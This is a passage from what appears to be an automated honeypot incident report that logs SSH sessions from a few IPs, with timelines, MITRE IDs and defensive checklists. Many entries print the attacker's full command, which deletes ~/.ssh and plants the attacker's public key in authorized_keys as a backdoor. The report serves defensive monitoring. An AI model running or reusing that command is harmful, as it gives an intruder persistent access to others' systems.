| `2026-04-22 08:49:00` | `cowrie.command.failed` |
| `2026-04-22 08:49:00` | `cowrie.log.closed` |
| `2026-04-22 08:49:01` | `cowrie.session.params` |
| `2026-04-22 08:49:01` | `cowrie.command.input` |
| `2026-04-22 08:49:01` | `cowrie.session.file_download` |
| `2026-04-22 08:49:01` | `cowrie.log.closed` |
| `2026-04-22 08:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e93a8e01c1c

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:49 |
| **Last Seen** | 2026-04-22 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:49:03` | `cowrie.session.connect` |
| `2026-04-22 08:49:03` | `cowrie.client.version` |
| `2026-04-22 08:49:03` | `cowrie.client.kex` |
| `2026-04-22 08:49:04` | `cowrie.login.success` |
| `2026-04-22 08:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7de69c644202

| Field | Detail |
|---|---|
| **Source IP** | `218.90.235[.]58` |
| **First Seen** | 2026-04-22 08:49 |
| **Last Seen** | 2026-04-22 08:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:49:49` | `cowrie.session.connect` |
| `2026-04-22 08:49:49` | `cowrie.client.version` |
| `2026-04-22 08:49:50` | `cowrie.client.kex` |
| `2026-04-22 08:49:50` | `cowrie.login.success` |
| `2026-04-22 08:49:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.90.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.90.235[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe9c30bf036e

| Field | Detail |
|---|---|
| **Source IP** | `218.90.235[.]58` |
| **First Seen** | 2026-04-22 08:50 |
| **Last Seen** | 2026-04-22 08:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:50:21` | `cowrie.session.connect` |
| `2026-04-22 08:50:21` | `cowrie.client.version` |
| `2026-04-22 08:50:21` | `cowrie.client.kex` |
| `2026-04-22 08:50:21` | `cowrie.login.success` |
| `2026-04-22 08:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.90.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `218.90.235[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3602f634d48f

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:53 |
| **Last Seen** | 2026-04-22 08:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:53:49` | `cowrie.session.connect` |
| `2026-04-22 08:53:49` | `cowrie.client.version` |
| `2026-04-22 08:53:49` | `cowrie.client.kex` |
| `2026-04-22 08:53:50` | `cowrie.login.success` |
| `2026-04-22 08:53:50` | `cowrie.session.params` |
| `2026-04-22 08:53:50` | `cowrie.command.input` |
| `2026-04-22 08:53:50` | `cowrie.command.failed` |
| `2026-04-22 08:53:50` | `cowrie.log.closed` |
| `2026-04-22 08:53:51` | `cowrie.session.params` |
| `2026-04-22 08:53:51` | `cowrie.command.input` |
| `2026-04-22 08:53:51` | `cowrie.session.file_download` |
| `2026-04-22 08:53:51` | `cowrie.log.closed` |
| `2026-04-22 08:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda11f5b6891

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:53 |
| **Last Seen** | 2026-04-22 08:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:53:53` | `cowrie.session.connect` |
| `2026-04-22 08:53:53` | `cowrie.client.version` |
| `2026-04-22 08:53:53` | `cowrie.client.kex` |
| `2026-04-22 08:53:54` | `cowrie.login.success` |
| `2026-04-22 08:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e2114e94f7c

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:58 |
| **Last Seen** | 2026-04-22 08:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:58:37` | `cowrie.session.connect` |
| `2026-04-22 08:58:37` | `cowrie.client.version` |
| `2026-04-22 08:58:37` | `cowrie.client.kex` |
| `2026-04-22 08:58:38` | `cowrie.login.success` |
| `2026-04-22 08:58:38` | `cowrie.session.params` |
| `2026-04-22 08:58:38` | `cowrie.command.input` |
| `2026-04-22 08:58:38` | `cowrie.command.failed` |
| `2026-04-22 08:58:38` | `cowrie.log.closed` |
| `2026-04-22 08:58:39` | `cowrie.session.params` |
| `2026-04-22 08:58:39` | `cowrie.command.input` |
| `2026-04-22 08:58:39` | `cowrie.session.file_download` |
| `2026-04-22 08:58:39` | `cowrie.log.closed` |
| `2026-04-22 08:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5084b4ba59fb

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 08:58 |
| **Last Seen** | 2026-04-22 08:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 08:58:41` | `cowrie.session.connect` |
| `2026-04-22 08:58:41` | `cowrie.client.version` |
| `2026-04-22 08:58:41` | `cowrie.client.kex` |
| `2026-04-22 08:58:42` | `cowrie.login.success` |
| `2026-04-22 08:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8894f2677703

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:01 |
| **Last Seen** | 2026-04-22 09:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:01:01` | `cowrie.session.connect` |
| `2026-04-22 09:01:01` | `cowrie.client.version` |
| `2026-04-22 09:01:01` | `cowrie.client.kex` |
| `2026-04-22 09:01:02` | `cowrie.login.success` |
| `2026-04-22 09:01:02` | `cowrie.session.params` |
| `2026-04-22 09:01:02` | `cowrie.command.input` |
| `2026-04-22 09:01:02` | `cowrie.command.failed` |
| `2026-04-22 09:01:02` | `cowrie.log.closed` |
| `2026-04-22 09:01:03` | `cowrie.session.params` |
| `2026-04-22 09:01:03` | `cowrie.command.input` |
| `2026-04-22 09:01:03` | `cowrie.session.file_download` |
| `2026-04-22 09:01:03` | `cowrie.log.closed` |
| `2026-04-22 09:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e4d0ebc8e0e

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:01 |
| **Last Seen** | 2026-04-22 09:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:01:05` | `cowrie.session.connect` |
| `2026-04-22 09:01:05` | `cowrie.client.version` |
| `2026-04-22 09:01:05` | `cowrie.client.kex` |
| `2026-04-22 09:01:06` | `cowrie.login.success` |
| `2026-04-22 09:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cc051594e3a

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:08 |
| **Last Seen** | 2026-04-22 09:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:08:13` | `cowrie.session.connect` |
| `2026-04-22 09:08:13` | `cowrie.client.version` |
| `2026-04-22 09:08:13` | `cowrie.client.kex` |
| `2026-04-22 09:08:14` | `cowrie.login.success` |
| `2026-04-22 09:08:14` | `cowrie.session.params` |
| `2026-04-22 09:08:14` | `cowrie.command.input` |
| `2026-04-22 09:08:14` | `cowrie.command.failed` |
| `2026-04-22 09:08:14` | `cowrie.log.closed` |
| `2026-04-22 09:08:15` | `cowrie.session.params` |
| `2026-04-22 09:08:15` | `cowrie.command.input` |
| `2026-04-22 09:08:15` | `cowrie.session.file_download` |
| `2026-04-22 09:08:15` | `cowrie.log.closed` |
| `2026-04-22 09:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-612ef08a5d76

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:08 |
| **Last Seen** | 2026-04-22 09:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:08:17` | `cowrie.session.connect` |
| `2026-04-22 09:08:17` | `cowrie.client.version` |
| `2026-04-22 09:08:17` | `cowrie.client.kex` |
| `2026-04-22 09:08:18` | `cowrie.login.success` |
| `2026-04-22 09:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adadb4baaa0

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:10 |
| **Last Seen** | 2026-04-22 09:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:10:36` | `cowrie.session.connect` |
| `2026-04-22 09:10:36` | `cowrie.client.version` |
| `2026-04-22 09:10:36` | `cowrie.client.kex` |
| `2026-04-22 09:10:37` | `cowrie.login.success` |
| `2026-04-22 09:10:37` | `cowrie.session.params` |
| `2026-04-22 09:10:37` | `cowrie.command.input` |
| `2026-04-22 09:10:37` | `cowrie.command.failed` |
| `2026-04-22 09:10:38` | `cowrie.log.closed` |
| `2026-04-22 09:10:38` | `cowrie.session.params` |
| `2026-04-22 09:10:38` | `cowrie.command.input` |
| `2026-04-22 09:10:38` | `cowrie.session.file_download` |
| `2026-04-22 09:10:38` | `cowrie.log.closed` |
| `2026-04-22 09:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b20999566e60

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:10 |
| **Last Seen** | 2026-04-22 09:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:10:40` | `cowrie.session.connect` |
| `2026-04-22 09:10:40` | `cowrie.client.version` |
| `2026-04-22 09:10:40` | `cowrie.client.kex` |
| `2026-04-22 09:10:41` | `cowrie.login.success` |
| `2026-04-22 09:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db45d3b58f31

| Field | Detail |
|---|---|
| **Source IP** | `207.180.238[.]248` |
| **First Seen** | 2026-04-22 09:12 |
| **Last Seen** | 2026-04-22 09:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:12:36` | `cowrie.session.connect` |
| `2026-04-22 09:12:36` | `cowrie.client.version` |
| `2026-04-22 09:12:36` | `cowrie.client.kex` |
| `2026-04-22 09:12:36` | `cowrie.login.success` |
| `2026-04-22 09:12:37` | `cowrie.session.params` |
| `2026-04-22 09:12:37` | `cowrie.command.input` |
| `2026-04-22 09:12:37` | `cowrie.command.failed` |
| `2026-04-22 09:12:37` | `cowrie.log.closed` |
| `2026-04-22 09:12:37` | `cowrie.session.params` |
| `2026-04-22 09:12:37` | `cowrie.command.input` |
| `2026-04-22 09:12:37` | `cowrie.session.file_download` |
| `2026-04-22 09:12:37` | `cowrie.log.closed` |
| `2026-04-22 09:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.238[.]248` to AbuseIPDB if not already reported
- [ ] Block `207.180.238[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dae9eaa5d71

| Field | Detail |
|---|---|
| **Source IP** | `207.180.238[.]248` |
| **First Seen** | 2026-04-22 09:12 |
| **Last Seen** | 2026-04-22 09:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:12:39` | `cowrie.session.connect` |
| `2026-04-22 09:12:39` | `cowrie.client.version` |
| `2026-04-22 09:12:39` | `cowrie.client.kex` |
| `2026-04-22 09:12:40` | `cowrie.login.success` |
| `2026-04-22 09:12:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.180.238[.]248` to AbuseIPDB if not already reported
- [ ] Block `207.180.238[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb110b79b664

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:13 |
| **Last Seen** | 2026-04-22 09:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:13:00` | `cowrie.session.connect` |
| `2026-04-22 09:13:00` | `cowrie.client.version` |
| `2026-04-22 09:13:00` | `cowrie.client.kex` |
| `2026-04-22 09:13:01` | `cowrie.login.success` |
| `2026-04-22 09:13:01` | `cowrie.session.params` |
| `2026-04-22 09:13:01` | `cowrie.command.input` |
| `2026-04-22 09:13:01` | `cowrie.command.failed` |
| `2026-04-22 09:13:02` | `cowrie.log.closed` |
| `2026-04-22 09:13:02` | `cowrie.session.params` |
| `2026-04-22 09:13:02` | `cowrie.command.input` |
| `2026-04-22 09:13:02` | `cowrie.session.file_download` |
| `2026-04-22 09:13:02` | `cowrie.log.closed` |
| `2026-04-22 09:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e93add3c2730

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:13 |
| **Last Seen** | 2026-04-22 09:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:13:04` | `cowrie.session.connect` |
| `2026-04-22 09:13:04` | `cowrie.client.version` |
| `2026-04-22 09:13:04` | `cowrie.client.kex` |
| `2026-04-22 09:13:05` | `cowrie.login.success` |
| `2026-04-22 09:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]45` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]45` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf421755e3b0

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]45` |
| **First Seen** | 2026-04-22 09:15 |
| **Last Seen** | 2026-04-22 09:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 09:15:24` | `cowrie.session.connect` |
| `2026-04-22 09:15:24` | `cowrie.client.version` |
| `2026-04-22 09:15:24` | `cowrie.client.kex` |
